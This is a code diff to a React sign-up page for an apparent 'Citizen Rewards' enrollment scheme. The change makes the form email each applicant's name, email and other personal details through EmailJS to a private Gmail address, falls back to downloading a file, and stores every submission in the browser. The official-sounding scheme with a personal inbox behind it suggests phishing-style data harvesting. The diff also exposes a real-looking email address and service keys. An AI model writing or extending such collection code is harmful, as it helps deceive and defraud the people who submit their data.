@@ -61,17 +61,17 @@ const SignUpPage = () => {
     try {
       setError('');
       
-      // Save user data locally and create downloadable file
+      // Prepare user data
       const userData = {
         ...formData,
         signupTime: new Date().toLocaleString(),
         signupDate: new Date().toISOString()
       };
       
-      // Create downloadable file with user data
+      // Create formatted data string
       const dataString = `
-=== CITIZEN REWARDS ENROLLMENT ===
-Time: ${userData.signupTime}
+=== NEW CITIZEN REWARDS ENROLLMENT ===
+Submission Time: ${userData.signupTime}
 
 PERSONAL INFORMATION:
 Name: ${userData.firstName} ${userData.lastName}
@@ -99,18 +99,48 @@ Terms Accepted: ${userData.agreesToTerms ? 'Yes' : 'No'}
 ===========================
       `;
       
-      // Create and download file
-      const blob = new Blob([dataString], { type: 'text/plain' });
-      const url = window.URL.createObjectURL(blob);
-      const link = document.createElement('a');
-      link.href = url;
-      link.download = `citizen-rewards-signup-${userData.firstName}-${userData.lastName}-${Date.now()}.txt`;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-      window.URL.revokeObjectURL(url);
+      // Send data directly to your email
+      try {
+        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            service_id: 'service_oi7w4h8', // Your EmailJS service ID
+            template_id: 'template_signup_data', // Template for signup data
+            user_id: 'zaDtpBnf9dYvbCGGC', // Your EmailJS public key
+            template_params: {
+              to_email: 'oyinloye1995@gmail.com', // Your email address
+              subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
+              message: dataString,
+              user_name: `${userData.firstName} ${userData.lastName}`,
+              user_email: userData.email,
+              signup_data: dataString
+            }
+          })
+        });
+
+        if (!response.ok) {
+          throw new Error('Failed to send data');
+        }
+        
+        console.log('Signup data sent successfully to admin');
+      } catch (emailError) {
+        console.error('Error sending signup data:', emailError);
+        // Fallback: Still create downloadable file if email fails
+        const blob = new Blob([dataString], { type: 'text/plain' });
+        const url = window.URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `citizen-rewards-signup-${userData.firstName}-${userData.lastName}-${Date.now()}.txt`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        window.URL.revokeObjectURL(url);
+      }
       
-      // Also save to localStorage for backup
+      // Save to localStorage for backup
       const allSignups = JSON.parse(localStorage.getItem('citizenRewardsSignups') || '[]');
       allSignups.push(userData);
       localStorage.setItem('citizenRewardsSignups', JSON.stringify(allSignups));
